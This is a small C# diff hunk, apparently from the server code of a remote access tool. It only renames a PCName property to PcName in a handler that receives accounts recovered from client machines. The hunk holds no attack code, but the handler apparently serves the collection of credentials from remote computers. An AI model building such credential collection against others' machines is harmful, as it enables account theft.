@@ -85,7 +85,7 @@ namespace xServer.Core.Commands
         {
             Client c = (Client) client;
 
-            string userAtPc = $"{c.Value.Username}@{c.Value.PCName}";
+            string userAtPc = $"{c.Value.Username}@{c.Value.PcName}";
 
             OnAccountsRecovered(message.RecoveredAccounts, userAtPc);
         }
